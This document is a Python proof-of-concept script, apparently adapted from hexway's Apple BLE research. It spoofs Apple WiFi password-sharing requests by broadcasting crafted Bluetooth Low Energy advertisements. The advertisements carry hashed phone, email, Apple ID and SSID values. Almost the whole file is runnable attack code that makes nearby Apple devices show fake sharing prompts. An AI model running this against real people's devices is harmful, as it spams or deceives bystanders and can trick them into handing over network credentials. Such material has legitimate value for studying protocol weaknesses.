
import random
import hashlib
import argparse
from time import sleep
import bluetooth._bluetooth as bluez
from utils.bluetooth_utils import (toggle_device, start_le_advertising, stop_le_advertising)
import colorama

colorama.init()
def banner():
    logo = colorama.Fore.BLUE + r"""
   _____                .__        __________.____     ___________
  /  _  \ ______ ______ |  |   ____\______   \    |    \_   _____/
 /  /_\  \\____ \\____ \|  | _/ __ \|    |  _/    |     |    __)_ 
/    |    \  |_> >  |_> >  |_\  ___/|    |   \    |___  |        \
\____|__  /   __/|   __/|____/\___  >______  /_______ \/_______  /
        \/|__|   |__|             \/       \/        \/        \/ 
        
               v1.0
                                Author; ThemeHackers
                                
                    Credit by hexway/
                                
                                 
"""                     
    print(logo)
banner()
help_desc = '''
WiFi password sharing spoofing PoC
---chipik
'''

parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-p', '--phone', default='none', help='Phone number (example: 39217XXX514)')
parser.add_argument('-e', '--email', default='none', help='Email address (example: test@test.com)')
parser.add_argument('-a', '--appleid', default='none', help='Email address (example: test@icloud.com)')
parser.add_argument('-s', '--ssid', required=True, help='WiFi SSID (example: test)')
parser.add_argument('-i', '--interval', default=200, type=int, help='Advertising interval')
args = parser.parse_args()


def get_hash(data, size=3):
    return tuple(bytearray.fromhex(hashlib.sha256(data.encode('utf-8')).hexdigest())[:size])


dev_id = 0  # the bluetooth device is hci0
toggle_device(dev_id, True)

header = (0x02, 0x01, 0x1a, 0x1a, 0xff, 0x4c, 0x00)
const1 = (0x0f, 0x11, 0xc0, 0x08)
id1 = (0xff, 0xff, 0xff)
contact_id_mail = get_hash(args.email)
contact_id_tel = get_hash(args.phone)
contact_id_appleid = get_hash(args.appleid)
id_wifi = get_hash(args.ssid)
const2 = (0x10, 0x02, 0x0b, 0x0c,)

print("Advertising Started... Press Ctrl+C to Stop")
try:
    sock = bluez.hci_open_dev(dev_id)
except:
    print("Cannot open bluetooth device %i" % dev_id)
    raise

try:
    start_le_advertising(sock, adv_type=0x00, min_interval=args.interval, max_interval=args.interval, data=(
                header + const1 + id1 + contact_id_appleid + contact_id_tel + contact_id_mail + id_wifi + const2))
    while True:
        sleep(2)
except:
    stop_le_advertising(sock)
    raise
